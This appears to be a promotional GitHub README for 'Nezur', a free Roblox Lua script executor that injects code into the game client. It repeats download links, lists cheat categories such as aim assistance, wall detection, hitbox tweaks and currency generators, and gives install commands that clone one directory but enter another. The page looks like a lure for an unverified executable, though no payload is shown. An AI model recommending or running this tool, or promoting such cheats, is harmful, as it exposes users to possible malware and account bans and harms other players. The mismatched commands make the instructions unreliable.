# Nezur PC v4.0 - Roblox Script Executor 2026

> **A compact, Windows-native Lua executor for Roblox.** Nezur provides one-click injection, an integrated hub containing hundreds of community scripts, and a straightforward desktop UI. It is free to use and does not require a key.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/calebzrcedwards2575/nezur-script-hub-loader?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://calebzrcedwards2575.github.io/nezur-script-hub-loader/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Nezur-v4.0%20Latest-brightgreen?style=for-the-badge" alt="Download Nezur">
  </a>
</p>

> **[Download Nezur v4.0](https://calebzrcedwards2575.github.io/nezur-script-hub-loader/)**  
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

[Download Latest Build](https://calebzrcedwards2575.github.io/nezur-script-hub-loader/)

---

## About Nezur

Nezur is a Windows-focused Lua script executor created for Roblox. It avoids bulky launchers and recurring key collection by keeping the installation simple: install the application, open Roblox, and inject with one click. A curated hub is included so users can find, load, and execute community scripts from inside the same interface.

The tool is intended for casual users as well as experienced scripters. It supports queued batch execution, includes debugging tools for investigating problems, and provides several UI language options. An automatic update system checks for new releases and compatibility fixes, reducing the need to update manually. Nezur can be used to test custom Lua code or work with scripts already available through the hub.

---

## Features at a Glance

- **Single-Click Injection** - Attach scripts to Roblox without working through complicated menus.
- **Integrated Script Hub** - Browse more than 500 community scripts, arranged by game and category.
- **SQLite-Powered Queue Storage** - Queue contents and recent script choices remain available between launches.
- **Automatic Updates** - Version checks run during startup, with updates applied automatically.
- **Multiple Interface Languages** - Select the language that best suits your workflow.
- **Small Disk Requirement** - The complete application uses under 40 MB of storage.
- **Sequential Batch Runs** - Place several scripts in a queue and execute them together with one action.
- **Included Debugger** - Review execution activity, inspect error logs, and test Lua scripts before running them in-game.

---

## Compatible Games and Script Types

| Game | Script Categories |
|------|-------------------|
| Adopt Me! | Pet hatching, trading automation, currency farming |
| Brookhaven | Roleplay enhancements, vehicle spawning, teleportation |
| Blox Fruits | Auto-farming, stat management, fruit finder |
| Jailbreak | Police/robber utilities, vehicle mods, coin collection |
| Tower of Hell | Auto-complete, obstacle bypass, speed adjustments |
| Arsenal | Aim assistance, weapon unlocks, visual tweaks |
| Phantom Forces | Recoil control, wall detection, hitbox adjustments |

---

## Minimum System Requirements

| Component | Minimum |
|-----------|---------|
| Operating System | Windows 10 (64-bit) or Windows 11 |
| Processor | Intel Core i3 / AMD Ryzen 3 or equivalent |
| RAM | 4 GB |
| Storage | 100 MB free space |
| .NET Framework | .NET Desktop Runtime 6.0 or later |
| Roblox | Latest Roblox Player installed |

---

## Installation and First Run

```bash
git clone https://github.com/calebzrcedwards2575/nezur-script-hub-loader.git
cd Nezur-Execut
start NezurExecutor.exe
```

Once Nezur opens, it automatically looks for your Roblox installation. Choose an entry from the script hub or open a personal `.lua` file, then press **Inject**.

---

## Popular Script Hub Searches for 2026

- Blox Fruits and King Legacy auto-farming scripts
- GUI script collections for Adopt Me and Jailbreak
- Teleportation and ESP utilities for Phantom Forces
- Infinite yield tools and admin commands for any game
- Lua samples intended for testing and learning
- Gamepass unlock tools and currency generators
- Anti-AFK features and automated clicking utilities

---

## Project Layout

```
Nezur/
├── NezurExecutor.exe
├── config/
│   ├── settings.json
│   └── language.json
├── scripts/
│   ├── hub/
│   │   ├── bloxfruits.lua
│   │   ├── jailbreak.lua
│   │   └── adoptme.lua
│   └── user/
├── data/
│   └── queue.db
├── updates/
└── README.md
```

---

## Frequently Asked Questions

**Is Nezur safe to use?**  
Nezur is distributed as-is. You are responsible for the executor and every script you choose to run. Review scripts carefully before executing them.

**What happens when Roblox updates?**  
Nezur's update system is intended to bring back compatibility shortly after Roblox client changes. If you encounter a problem, look for a newer release or review the repository for guidance.

**How is Nezur different from paid executors?**  
Nezur is free, with no key or subscription requirement. Paid alternatives may provide different levels of stability or script support, but Nezur supplies the core functionality many users need.

**Could using Nezur result in a Roblox ban?**  
Every third-party executor involves account-related risk, and Nezur makes no promise that an account will remain safe. Use it at your own discretion, and consider separate accounts when testing.

**Where does Nezur keep my scripts?**  
Scripts added by the user are stored under `scripts/user/`. The queue and recently selected scripts are saved locally in the SQLite file `data/queue.db`.

---

## 2026 Development Roadmap

- [ ] Create a cloud-based script hub with community ratings and comments
- [ ] Add execution history and logging for debugging
- [ ] Support configurable hotkeys for faster injection
- [ ] Grow language coverage to more than 10 languages
- [ ] Improve injection speed to minimize delays when launching games

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.

---

<p align="center">
  <i>Nezur v4.0 - A lightweight, free executor for Roblox scripters.</i>
</p>
